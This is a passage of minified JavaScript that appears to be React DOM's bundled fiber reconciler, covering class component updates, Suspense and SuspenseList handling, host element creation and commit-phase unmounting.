        s !== d || p !== y || $e.current || $t ? (typeof x == "function" && (Es(t, n, x, r), y = t.memoizedState), (u = $t || Ju(t, n, u, r, p, y, a) || !1) ? (c || typeof l.UNSAFE_componentWillUpdate != "function" && typeof l.componentWillUpdate != "function" || (typeof l.componentWillUpdate == "function" && l.componentWillUpdate(r, y, a), typeof l.UNSAFE_componentWillUpdate == "function" && l.UNSAFE_componentWillUpdate(r, y, a)), typeof l.componentDidUpdate == "function" && (t.flags |= 4), typeof l.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof l.componentDidUpdate != "function" || s === e.memoizedProps && p === e.memoizedState || (t.flags |= 4), typeof l.getSnapshotBeforeUpdate != "function" || s === e.memoizedProps && p === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = y), l.props = r, l.state = y, l.context = a, r = u) : (typeof l.componentDidUpdate != "function" || s === e.memoizedProps && p === e.memoizedState || (t.flags |= 4), typeof l.getSnapshotBeforeUpdate != "function" || s === e.memoizedProps && p === e.memoizedState || (t.flags |= 1024), r = !1)
    }
    return Ts(e, t, n, r, i, o)
}

function Ts(e, t, n, r, o, i) {
    Kf(e, t);
    var l = (t.flags & 128) !== 0;
    if (!r && !l) return o && Ku(t, n, !1), jt(e, t, i);
    r = t.stateNode, Ly.current = t;
    var s = l && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return t.flags |= 1, e !== null && l ? (t.child = nr(t, e.child, null, i), t.child = nr(t, null, s, i)) : Oe(e, t, s, i), t.memoizedState = r.state, o && Ku(t, n, !0), t.child
}

function Gf(e) {
    var t = e.stateNode;
    t.pendingContext ? Vu(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Vu(e, t.context, !1), Ta(e, t.containerInfo)
}

function ac(e, t, n, r, o) {
    return tr(), Sa(o), t.flags |= 256, Oe(e, t, n, r), t.child
}

var js = {dehydrated: null, treeContext: null, retryLane: 0};

function Os(e) {
    return {baseLanes: e, cachePool: null, transitions: null}
}

function Qf(e, t, n) {
    var r = t.pendingProps, o = ne.current, i = !1, l = (t.flags & 128) !== 0, s;
    if ((s = l) || (s = e !== null && e.memoizedState === null ? !1 : (o & 2) !== 0), s ? (i = !0, t.flags &= -129) : (e === null || e.memoizedState !== null) && (o |= 1), Y(ne, o & 1), e === null) return Ss(t), e = t.memoizedState, e !== null && (e = e.dehydrated, e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1, null) : (l = r.children, e = r.fallback, i ? (r = t.mode, i = t.child, l = {
        mode: "hidden",
        children: l
    }, !(r & 1) && i !== null ? (i.childLanes = 0, i.pendingProps = l) : i = Vi(l, r, 0, null), e = fn(e, r, n, null), i.return = t, e.return = t, i.sibling = e, t.child = i, t.child.memoizedState = Os(n), t.memoizedState = js, e) : Ma(t, l));
    if (o = e.memoizedState, o !== null && (s = o.dehydrated, s !== null)) return Iy(e, t, l, r, s, o, n);
    if (i) {
        i = r.fallback, l = t.mode, o = e.child, s = o.sibling;
        var a = {mode: "hidden", children: r.children};
        return !(l & 1) && t.child !== o ? (r = t.child, r.childLanes = 0, r.pendingProps = a, t.deletions = null) : (r = Jt(o, a), r.subtreeFlags = o.subtreeFlags & 14680064), s !== null ? i = Jt(s, i) : (i = fn(i, l, n, null), i.flags |= 2), i.return = t, r.return = t, r.sibling = i, t.child = r, r = i, i = t.child, l = e.child.memoizedState, l = l === null ? Os(n) : {
            baseLanes: l.baseLanes | n,
            cachePool: null,
            transitions: l.transitions
        }, i.memoizedState = l, i.childLanes = e.childLanes & ~n, t.memoizedState = js, r
    }
    return i = e.child, e = i.sibling, r = Jt(i, {
        mode: "visible",
        children: r.children
    }), !(t.mode & 1) && (r.lanes = n), r.return = t, r.sibling = null, e !== null && (n = t.deletions, n === null ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = r, t.memoizedState = null, r
}

function Ma(e, t) {
    return t = Vi({mode: "visible", children: t}, e.mode, 0, null), t.return = e, e.child = t
}

function Mo(e, t, n, r) {
    return r !== null && Sa(r), nr(t, e.child, null, n), e = Ma(t, t.pendingProps.children), e.flags |= 2, t.memoizedState = null, e
}

function Iy(e, t, n, r, o, i, l) {
    if (n) return t.flags & 256 ? (t.flags &= -257, r = Ll(Error(T(422))), Mo(e, t, l, r)) : t.memoizedState !== null ? (t.child = e.child, t.flags |= 128, null) : (i = r.fallback, o = t.mode, r = Vi({
        mode: "visible",
        children: r.children
    }, o, 0, null), i = fn(i, o, l, null), i.flags |= 2, r.return = t, i.return = t, r.sibling = i, t.child = r, t.mode & 1 && nr(t, e.child, null, l), t.child.memoizedState = Os(l), t.memoizedState = js, i);
    if (!(t.mode & 1)) return Mo(e, t, l, null);
    if (o.data === "$!") {
        if (r = o.nextSibling && o.nextSibling.dataset, r) var s = r.dgst;
        return r = s, i = Error(T(419)), r = Ll(i, r, void 0), Mo(e, t, l, r)
    }
    if (s = (l & e.childLanes) !== 0, Me || s) {
        if (r = ge, r !== null) {
            switch (l & -l) {
                case 4:
                    o = 2;
                    break;
                case 16:
                    o = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    o = 32;
                    break;
                case 536870912:
                    o = 268435456;
                    break;
                default:
                    o = 0
            }
            o = o & (r.suspendedLanes | l) ? 0 : o, o !== 0 && o !== i.retryLane && (i.retryLane = o, Tt(e, o), st(r, e, o, -1))
        }
        return Ua(), r = Ll(Error(T(421))), Mo(e, t, l, r)
    }
    return o.data === "$?" ? (t.flags |= 128, t.child = e.child, t = Ky.bind(null, e), o._reactRetry = t, null) : (e = i.treeContext, Be = Gt(o.nextSibling), Ue = t, Z = !0, rt = null, e !== null && (Ve[Ke++] = xt, Ve[Ke++] = St, Ve[Ke++] = hn, xt = e.id, St = e.overflow, hn = t), t = Ma(t, r.children), t.flags |= 4096, t)
}

function uc(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t), Cs(e.return, t, n)
}

function Il(e, t, n, r, o) {
    var i = e.memoizedState;
    i === null ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: o
    } : (i.isBackwards = t, i.rendering = null, i.renderingStartTime = 0, i.last = r, i.tail = n, i.tailMode = o)
}

function Xf(e, t, n) {
    var r = t.pendingProps, o = r.revealOrder, i = r.tail;
    if (Oe(e, t, r.children, n), r = ne.current, r & 2) r = r & 1 | 2, t.flags |= 128; else {
        if (e !== null && e.flags & 128) e:for (e = t.child; e !== null;) {
            if (e.tag === 13) e.memoizedState !== null && uc(e, n, t); else if (e.tag === 19) uc(e, n, t); else if (e.child !== null) {
                e.child.return = e, e = e.child;
                continue
            }
            if (e === t) break e;
            for (; e.sibling === null;) {
                if (e.return === null || e.return === t) break e;
                e = e.return
            }
            e.sibling.return = e.return, e = e.sibling
        }
        r &= 1
    }
    if (Y(ne, r), !(t.mode & 1)) t.memoizedState = null; else switch (o) {
        case"forwards":
            for (n = t.child, o = null; n !== null;) e = n.alternate, e !== null && vi(e) === null && (o = n), n = n.sibling;
            n = o, n === null ? (o = t.child, t.child = null) : (o = n.sibling, n.sibling = null), Il(t, !1, o, n, i);
            break;
        case"backwards":
            for (n = null, o = t.child, t.child = null; o !== null;) {
                if (e = o.alternate, e !== null && vi(e) === null) {
                    t.child = o;
                    break
                }
                e = o.sibling, o.sibling = n, n = o, o = e
            }
            Il(t, !0, n, null, i);
            break;
        case"together":
            Il(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null
    }
    return t.child
}

function Xo(e, t) {
    !(t.mode & 1) && e !== null && (e.alternate = null, t.alternate = null, t.flags |= 2)
}

function jt(e, t, n) {
    if (e !== null && (t.dependencies = e.dependencies), yn |= t.lanes, !(n & t.childLanes)) return null;
    if (e !== null && t.child !== e.child) throw Error(T(153));
    if (t.child !== null) {
        for (e = t.child, n = Jt(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null;) e = e.sibling, n = n.sibling = Jt(e, e.pendingProps), n.return = t;
        n.sibling = null
    }
    return t.child
}

function Dy(e, t, n) {
    switch (t.tag) {
        case 3:
            Gf(t), tr();
            break;
        case 5:
            Cf(t);
            break;
        case 1:
            Fe(t.type) && fi(t);
            break;
        case 4:
            Ta(t, t.stateNode.containerInfo);
            break;
        case 10:
            var r = t.type._context, o = t.memoizedProps.value;
            Y(hi, r._currentValue), r._currentValue = o;
            break;
        case 13:
            if (r = t.memoizedState, r !== null) return r.dehydrated !== null ? (Y(ne, ne.current & 1), t.flags |= 128, null) : n & t.child.childLanes ? Qf(e, t, n) : (Y(ne, ne.current & 1), e = jt(e, t, n), e !== null ? e.sibling : null);
            Y(ne, ne.current & 1);
            break;
        case 19:
            if (r = (n & t.childLanes) !== 0, e.flags & 128) {
                if (r) return Xf(e, t, n);
                t.flags |= 128
            }
            if (o = t.memoizedState, o !== null && (o.rendering = null, o.tail = null, o.lastEffect = null), Y(ne, ne.current), r) break;
            return null;
        case 22:
        case 23:
            return t.lanes = 0, Vf(e, t, n)
    }
    return jt(e, t, n)
}

var Yf, _s, Jf, qf;
Yf = function (e, t) {
    for (var n = t.child; n !== null;) {
        if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode); else if (n.tag !== 4 && n.child !== null) {
            n.child.return = n, n = n.child;
            continue
        }
        if (n === t) break;
        for (; n.sibling === null;) {
            if (n.return === null || n.return === t) return;
            n = n.return
        }
        n.sibling.return = n.return, n = n.sibling
    }
};
_s = function () {
};
Jf = function (e, t, n, r) {
    var o = e.memoizedProps;
    if (o !== r) {
        e = t.stateNode, cn(ht.current);
        var i = null;
        switch (n) {
            case"input":
                o = ql(e, o), r = ql(e, r), i = [];
                break;
            case"select":
                o = oe({}, o, {value: void 0}), r = oe({}, r, {value: void 0}), i = [];
                break;
            case"textarea":
                o = ts(e, o), r = ts(e, r), i = [];
                break;
            default:
                typeof o.onClick != "function" && typeof r.onClick == "function" && (e.onclick = ci)
        }
        rs(n, r);
        var l;
        n = null;
        for (u in o) if (!r.hasOwnProperty(u) && o.hasOwnProperty(u) && o[u] != null) if (u === "style") {
            var s = o[u];
            for (l in s) s.hasOwnProperty(l) && (n || (n = {}), n[l] = "")
        } else u !== "dangerouslySetInnerHTML" && u !== "children" && u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && u !== "autoFocus" && (Vr.hasOwnProperty(u) ? i || (i = []) : (i = i || []).push(u, null));
        for (u in r) {
            var a = r[u];
            if (s = o != null ? o[u] : void 0, r.hasOwnProperty(u) && a !== s && (a != null || s != null)) if (u === "style") if (s) {
                for (l in s) !s.hasOwnProperty(l) || a && a.hasOwnProperty(l) || (n || (n = {}), n[l] = "");
                for (l in a) a.hasOwnProperty(l) && s[l] !== a[l] && (n || (n = {}), n[l] = a[l])
            } else n || (i || (i = []), i.push(u, n)), n = a; else u === "dangerouslySetInnerHTML" ? (a = a ? a.__html : void 0, s = s ? s.__html : void 0, a != null && s !== a && (i = i || []).push(u, a)) : u === "children" ? typeof a != "string" && typeof a != "number" || (i = i || []).push(u, "" + a) : u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && (Vr.hasOwnProperty(u) ? (a != null && u === "onScroll" && J("scroll", e), i || s === a || (i = [])) : (i = i || []).push(u, a))
        }
        n && (i = i || []).push("style", n);
        var u = i;
        (t.updateQueue = u) && (t.flags |= 4)
    }
};
qf = function (e, t, n, r) {
    n !== r && (t.flags |= 4)
};

function Nr(e, t) {
    if (!Z) switch (e.tailMode) {
        case"hidden":
            t = e.tail;
            for (var n = null; t !== null;) t.alternate !== null && (n = t), t = t.sibling;
            n === null ? e.tail = null : n.sibling = null;
            break;
        case"collapsed":
            n = e.tail;
            for (var r = null; n !== null;) n.alternate !== null && (r = n), n = n.sibling;
            r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
    }
}

function Ee(e) {
    var t = e.alternate !== null && e.alternate.child === e.child, n = 0, r = 0;
    if (t) for (var o = e.child; o !== null;) n |= o.lanes | o.childLanes, r |= o.subtreeFlags & 14680064, r |= o.flags & 14680064, o.return = e, o = o.sibling; else for (o = e.child; o !== null;) n |= o.lanes | o.childLanes, r |= o.subtreeFlags, r |= o.flags, o.return = e, o = o.sibling;
    return e.subtreeFlags |= r, e.childLanes = n, t
}

function My(e, t, n) {
    var r = t.pendingProps;
    switch (xa(t), t.tag) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return Ee(t), null;
        case 1:
            return Fe(t.type) && di(), Ee(t), null;
        case 3:
            return r = t.stateNode, rr(), q($e), q(Te), Oa(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), (e === null || e.child === null) && (Io(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024, rt !== null && (As(rt), rt = null))), _s(e, t), Ee(t), null;
        case 5:
            ja(t);
            var o = cn(ro.current);
            if (n = t.type, e !== null && t.stateNode != null) Jf(e, t, n, r, o), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152); else {
                if (!r) {
                    if (t.stateNode === null) throw Error(T(166));
                    return Ee(t), null
                }
                if (e = cn(ht.current), Io(t)) {
                    r = t.stateNode, n = t.type;
                    var i = t.memoizedProps;
                    switch (r[dt] = t, r[to] = i, e = (t.mode & 1) !== 0, n) {
                        case"dialog":
                            J("cancel", r), J("close", r);
                            break;
                        case"iframe":
                        case"object":
                        case"embed":
                            J("load", r);
                            break;
                        case"video":
                        case"audio":
                            for (o = 0; o < Dr.length; o++) J(Dr[o], r);
                            break;
                        case"source":
                            J("error", r);
                            break;
                        case"img":
                        case"image":
                        case"link":
                            J("error", r), J("load", r);
                            break;
                        case"details":
                            J("toggle", r);
                            break;
                        case"input":
                            vu(r, i), J("invalid", r);
                            break;
                        case"select":
                            r._wrapperState = {wasMultiple: !!i.multiple}, J("invalid", r);
                            break;
                        case"textarea":
                            xu(r, i), J("invalid", r)
                    }
                    rs(n, i), o = null;
                    for (var l in i) if (i.hasOwnProperty(l)) {
                        var s = i[l];
                        l === "children" ? typeof s == "string" ? r.textContent !== s && (i.suppressHydrationWarning !== !0 && Lo(r.textContent, s, e), o = ["children", s]) : typeof s == "number" && r.textContent !== "" + s && (i.suppressHydrationWarning !== !0 && Lo(r.textContent, s, e), o = ["children", "" + s]) : Vr.hasOwnProperty(l) && s != null && l === "onScroll" && J("scroll", r)
                    }
                    switch (n) {
                        case"input":
                            ko(r), wu(r, i, !0);
                            break;
                        case"textarea":
                            ko(r), Su(r);
                            break;
                        case"select":
                        case"option":
                            break;
                        default:
                            typeof i.onClick == "function" && (r.onclick = ci)
                    }
                    r = o, t.updateQueue = r, r !== null && (t.flags |= 4)
                } else {
                    l = o.nodeType === 9 ? o : o.ownerDocument, e === "http://www.w3.org/1999/xhtml" && (e = kd(n)), e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = l.createElement("div"), e.innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = l.createElement(n, {is: r.is}) : (e = l.createElement(n), n === "select" && (l = e, r.multiple ? l.multiple = !0 : r.size && (l.size = r.size))) : e = l.createElementNS(e, n), e[dt] = t, e[to] = r, Yf(e, t, !1, !1), t.stateNode = e;
                    e:{
                        switch (l = os(n, r), n) {
                            case"dialog":
                                J("cancel", e), J("close", e), o = r;
                                break;
                            case"iframe":
                            case"object":
                            case"embed":
                                J("load", e), o = r;
                                break;
                            case"video":
                            case"audio":
                                for (o = 0; o < Dr.length; o++) J(Dr[o], e);
                                o = r;
                                break;
                            case"source":
                                J("error", e), o = r;
                                break;
                            case"img":
                            case"image":
                            case"link":
                                J("error", e), J("load", e), o = r;
                                break;
                            case"details":
                                J("toggle", e), o = r;
                                break;
                            case"input":
                                vu(e, r), o = ql(e, r), J("invalid", e);
                                break;
                            case"option":
                                o = r;
                                break;
                            case"select":
                                e._wrapperState = {wasMultiple: !!r.multiple}, o = oe({}, r, {value: void 0}), J("invalid", e);
                                break;
                            case"textarea":
                                xu(e, r), o = ts(e, r), J("invalid", e);
                                break;
                            default:
                                o = r
                        }
                        rs(n, o), s = o;
                        for (i in s) if (s.hasOwnProperty(i)) {
                            var a = s[i];
                            i === "style" ? Td(e, a) : i === "dangerouslySetInnerHTML" ? (a = a ? a.__html : void 0, a != null && Nd(e, a)) : i === "children" ? typeof a == "string" ? (n !== "textarea" || a !== "") && Kr(e, a) : typeof a == "number" && Kr(e, "" + a) : i !== "suppressContentEditableWarning" && i !== "suppressHydrationWarning" && i !== "autoFocus" && (Vr.hasOwnProperty(i) ? a != null && i === "onScroll" && J("scroll", e) : a != null && ia(e, i, a, l))
                        }
                        switch (n) {
                            case"input":
                                ko(e), wu(e, r, !1);
                                break;
                            case"textarea":
                                ko(e), Su(e);
                                break;
                            case"option":
                                r.value != null && e.setAttribute("value", "" + qt(r.value));
                                break;
                            case"select":
                                e.multiple = !!r.multiple, i = r.value, i != null ? Wn(e, !!r.multiple, i, !1) : r.defaultValue != null && Wn(e, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                typeof o.onClick == "function" && (e.onclick = ci)
                        }
                        switch (n) {
                            case"button":
                            case"input":
                            case"select":
                            case"textarea":
                                r = !!r.autoFocus;
                                break e;
                            case"img":
                                r = !0;
                                break e;
                            default:
                                r = !1
                        }
                    }
                    r && (t.flags |= 4)
                }
                t.ref !== null && (t.flags |= 512, t.flags |= 2097152)
            }
            return Ee(t), null;
        case 6:
            if (e && t.stateNode != null) qf(e, t, e.memoizedProps, r); else {
                if (typeof r != "string" && t.stateNode === null) throw Error(T(166));
                if (n = cn(ro.current), cn(ht.current), Io(t)) {
                    if (r = t.stateNode, n = t.memoizedProps, r[dt] = t, (i = r.nodeValue !== n) && (e = Ue, e !== null)) switch (e.tag) {
                        case 3:
                            Lo(r.nodeValue, n, (e.mode & 1) !== 0);
                            break;
                        case 5:
                            e.memoizedProps.suppressHydrationWarning !== !0 && Lo(r.nodeValue, n, (e.mode & 1) !== 0)
                    }
                    i && (t.flags |= 4)
                } else r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r), r[dt] = t, t.stateNode = r
            }
            return Ee(t), null;
        case 13:
            if (q(ne), r = t.memoizedState, e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
                if (Z && Be !== null && t.mode & 1 && !(t.flags & 128)) hf(), tr(), t.flags |= 98560, i = !1; else if (i = Io(t), r !== null && r.dehydrated !== null) {
                    if (e === null) {
                        if (!i) throw Error(T(318));
                        if (i = t.memoizedState, i = i !== null ? i.dehydrated : null, !i) throw Error(T(317));
                        i[dt] = t
                    } else tr(), !(t.flags & 128) && (t.memoizedState = null), t.flags |= 4;
                    Ee(t), i = !1
                } else rt !== null && (As(rt), rt = null), i = !0;
                if (!i) return t.flags & 65536 ? t : null
            }
            return t.flags & 128 ? (t.lanes = n, t) : (r = r !== null, r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192, t.mode & 1 && (e === null || ne.current & 1 ? me === 0 && (me = 3) : Ua())), t.updateQueue !== null && (t.flags |= 4), Ee(t), null);
        case 4:
            return rr(), _s(e, t), e === null && Zr(t.stateNode.containerInfo), Ee(t), null;
        case 10:
            return ka(t.type._context), Ee(t), null;
        case 17:
            return Fe(t.type) && di(), Ee(t), null;
        case 19:
            if (q(ne), i = t.memoizedState, i === null) return Ee(t), null;
            if (r = (t.flags & 128) !== 0, l = i.rendering, l === null) if (r) Nr(i, !1); else {
                if (me !== 0 || e !== null && e.flags & 128) for (e = t.child; e !== null;) {
                    if (l = vi(e), l !== null) {
                        for (t.flags |= 128, Nr(i, !1), r = l.updateQueue, r !== null && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; n !== null;) i = n, e = r, i.flags &= 14680066, l = i.alternate, l === null ? (i.childLanes = 0, i.lanes = e, i.child = null, i.subtreeFlags = 0, i.memoizedProps = null, i.memoizedState = null, i.updateQueue = null, i.dependencies = null, i.stateNode = null) : (i.childLanes = l.childLanes, i.lanes = l.lanes, i.child = l.child, i.subtreeFlags = 0, i.deletions = null, i.memoizedProps = l.memoizedProps, i.memoizedState = l.memoizedState, i.updateQueue = l.updateQueue, i.type = l.type, e = l.dependencies, i.dependencies = e === null ? null : {
                            lanes: e.lanes,
                            firstContext: e.firstContext
                        }), n = n.sibling;
                        return Y(ne, ne.current & 1 | 2), t.child
                    }
                    e = e.sibling
                }
                i.tail !== null && ae() > ir && (t.flags |= 128, r = !0, Nr(i, !1), t.lanes = 4194304)
            } else {
                if (!r) if (e = vi(l), e !== null) {
                    if (t.flags |= 128, r = !0, n = e.updateQueue, n !== null && (t.updateQueue = n, t.flags |= 4), Nr(i, !0), i.tail === null && i.tailMode === "hidden" && !l.alternate && !Z) return Ee(t), null
                } else 2 * ae() - i.renderingStartTime > ir && n !== 1073741824 && (t.flags |= 128, r = !0, Nr(i, !1), t.lanes = 4194304);
                i.isBackwards ? (l.sibling = t.child, t.child = l) : (n = i.last, n !== null ? n.sibling = l : t.child = l, i.last = l)
            }
            return i.tail !== null ? (t = i.tail, i.rendering = t, i.tail = t.sibling, i.renderingStartTime = ae(), t.sibling = null, n = ne.current, Y(ne, r ? n & 1 | 2 : n & 1), t) : (Ee(t), null);
        case 22:
        case 23:
            return Ba(), r = t.memoizedState !== null, e !== null && e.memoizedState !== null !== r && (t.flags |= 8192), r && t.mode & 1 ? ze & 1073741824 && (Ee(t), t.subtreeFlags & 6 && (t.flags |= 8192)) : Ee(t), null;
        case 24:
            return null;
        case 25:
            return null
    }
    throw Error(T(156, t.tag))
}

function $y(e, t) {
    switch (xa(t), t.tag) {
        case 1:
            return Fe(t.type) && di(), e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 3:
            return rr(), q($e), q(Te), Oa(), e = t.flags, e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128, t) : null;
        case 5:
            return ja(t), null;
        case 13:
            if (q(ne), e = t.memoizedState, e !== null && e.dehydrated !== null) {
                if (t.alternate === null) throw Error(T(340));
                tr()
            }
            return e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 19:
            return q(ne), null;
        case 4:
            return rr(), null;
        case 10:
            return ka(t.type._context), null;
        case 22:
        case 23:
            return Ba(), null;
        case 24:
            return null;
        default:
            return null
    }
}

var $o = !1, Ne = !1, Fy = typeof WeakSet == "function" ? WeakSet : Set, _ = null;

function Un(e, t) {
    var n = e.ref;
    if (n !== null) if (typeof n == "function") try {
        n(null)
    } catch (r) {
        le(e, t, r)
    } else n.current = null
}

function Ps(e, t, n) {
    try {
        n()
    } catch (r) {
        le(e, t, r)
    }
}

var cc = !1;

function Ay(e, t) {
    if (ms = si, e = tf(), va(e)) {
        if ("selectionStart" in e) var n = {start: e.selectionStart, end: e.selectionEnd}; else e:{
            n = (n = e.ownerDocument) && n.defaultView || window;
            var r = n.getSelection && n.getSelection();
            if (r && r.rangeCount !== 0) {
                n = r.anchorNode;
                var o = r.anchorOffset, i = r.focusNode;
                r = r.focusOffset;
                try {
                    n.nodeType, i.nodeType
                } catch {
                    n = null;
                    break e
                }
                var l = 0, s = -1, a = -1, u = 0, c = 0, d = e, p = null;
                t:for (; ;) {
                    for (var x; d !== n || o !== 0 && d.nodeType !== 3 || (s = l + o), d !== i || r !== 0 && d.nodeType !== 3 || (a = l + r), d.nodeType === 3 && (l += d.nodeValue.length), (x = d.firstChild) !== null;) p = d, d = x;
                    for (; ;) {
                        if (d === e) break t;
                        if (p === n && ++u === o && (s = l), p === i && ++c === r && (a = l), (x = d.nextSibling) !== null) break;
                        d = p, p = d.parentNode
                    }
                    d = x
                }
                n = s === -1 || a === -1 ? null : {start: s, end: a}
            } else n = null
        }
        n = n || {start: 0, end: 0}
    } else n = null;
    for (hs = {
        focusedElem: e,
        selectionRange: n
    }, si = !1, _ = t; _ !== null;) if (t = _, e = t.child, (t.subtreeFlags & 1028) !== 0 && e !== null) e.return = t, _ = e; else for (; _ !== null;) {
        t = _;
        try {
            var y = t.alternate;
            if (t.flags & 1024) switch (t.tag) {
                case 0:
                case 11:
                case 15:
                    break;
                case 1:
                    if (y !== null) {
                        var v = y.memoizedProps, C = y.memoizedState, g = t.stateNode,
                            h = g.getSnapshotBeforeUpdate(t.elementType === t.type ? v : tt(t.type, v), C);
                        g.__reactInternalSnapshotBeforeUpdate = h
                    }
                    break;
                case 3:
                    var w = t.stateNode.containerInfo;
                    w.nodeType === 1 ? w.textContent = "" : w.nodeType === 9 && w.documentElement && w.removeChild(w.documentElement);
                    break;
                case 5:
                case 6:
                case 4:
                case 17:
                    break;
                default:
                    throw Error(T(163))
            }
        } catch (S) {
            le(t, t.return, S)
        }
        if (e = t.sibling, e !== null) {
            e.return = t.return, _ = e;
            break
        }
        _ = t.return
    }
    return y = cc, cc = !1, y
}

function br(e, t, n) {
    var r = t.updateQueue;
    if (r = r !== null ? r.lastEffect : null, r !== null) {
        var o = r = r.next;
        do {
            if ((o.tag & e) === e) {
                var i = o.destroy;
                o.destroy = void 0, i !== void 0 && Ps(t, n, i)
            }
            o = o.next
        } while (o !== r)
    }
}

function Hi(e, t) {
    if (t = t.updateQueue, t = t !== null ? t.lastEffect : null, t !== null) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r()
            }
            n = n.next
        } while (n !== t)
    }
}

function Ls(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
            case 5:
                e = n;
                break;
            default:
                e = n
        }
        typeof t == "function" ? t(e) : t.current = e
    }
}

function Zf(e) {
    var t = e.alternate;
    t !== null && (e.alternate = null, Zf(t)), e.child = null, e.deletions = null, e.sibling = null, e.tag === 5 && (t = e.stateNode, t !== null && (delete t[dt], delete t[to], delete t[vs], delete t[xy], delete t[Sy])), e.stateNode = null, e.return = null, e.dependencies = null, e.memoizedProps = null, e.memoizedState = null, e.pendingProps = null, e.stateNode = null, e.updateQueue = null
}

function ep(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4
}

function dc(e) {
    e:for (; ;) {
        for (; e.sibling === null;) {
            if (e.return === null || ep(e.return)) return null;
            e = e.return
        }
        for (e.sibling.return = e.return, e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18;) {
            if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
            e.child.return = e, e = e.child
        }
        if (!(e.flags & 2)) return e.stateNode
    }
}

function Is(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode, t.insertBefore(e, n)) : (t = n, t.appendChild(e)), n = n._reactRootContainer, n != null || t.onclick !== null || (t.onclick = ci)); else if (r !== 4 && (e = e.child, e !== null)) for (Is(e, t, n), e = e.sibling; e !== null;) Is(e, t, n), e = e.sibling
}

function Ds(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.insertBefore(e, t) : n.appendChild(e); else if (r !== 4 && (e = e.child, e !== null)) for (Ds(e, t, n), e = e.sibling; e !== null;) Ds(e, t, n), e = e.sibling
}

var ve = null, nt = !1;

function It(e, t, n) {
    for (n = n.child; n !== null;) tp(e, t, n), n = n.sibling
}

function tp(e, t, n) {
    if (mt && typeof mt.onCommitFiberUnmount == "function") try {
        mt.onCommitFiberUnmount(Mi, n)
    } catch {
    }
    switch (n.tag) {
        case 5:
            Ne || Un(n, t);
        case 6:
            var r = ve, o = nt;
            ve = null, It(e, t, n), ve = r, nt = o, ve !== null && (nt ? (e = ve, n = n.stateNode, e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n)) : ve.removeChild(n.stateNode));
            break;
        case 18:
            ve !== null && (nt ? (e = ve, n = n.stateNode, e.nodeType === 8 ? Rl(e.parentNode, n) : e.nodeType === 1 && Rl(e, n), Yr(e)) : Rl(ve, n.stateNode));
            break;
        case 4:
            r = ve, o = nt, ve = n.stateNode.containerInfo, nt = !0, It(e, t, n), ve = r, nt = o;
            break;
        case 0:
        case 11:
        case 14:
        case 15:
            if (!Ne && (r = n.updateQueue, r !== null && (r = r.lastEffect, r !== null))) {
                o = r = r.next;
                do {
                    var i = o, l = i.destroy;
                    i = i.tag, l !== void 0 && (i & 2 || i & 4) && Ps(n, t, l), o = o.next
                } while (o !== r)
            }
            It(e, t, n);
            break;
        case 1:
            if (!Ne && (Un(n, t), r = n.stateNode, typeof r.componentWillUnmount == "function")) try {
                r.props = n.memoizedProps, r.state = n.memoizedState, r.componentWillUnmount()
            } catch (s) {
                le(n, t, s)
            }
            It(e, t, n);
            break;
        case 21:
            It(e, t, n);
            break;
        case 22:
            n.mode & 1 ? (Ne = (r = Ne) || n.memoizedState !== null, It(e, t, n), Ne = r) : It(e, t, n);
            break;
        default:
            It(e, t, n)
    }
}

function fc(e) {
    var t = e.updateQueue;
    if (t !== null) {
        e.updateQueue = null;
        var n = e.stateNode;
        n === null && (n = e.stateNode = new Fy), t.forEach(function (r) {
            var o = Gy.bind(null, e, r);
            n.has(r) || (n.add(r), r.then(o, o))
        })
    }
}

function Ze(e, t) {
    var n = t.deletions;
    if (n !== null) for (var r = 0; r < n.length; r++) {
        var o = n[r];
        try {
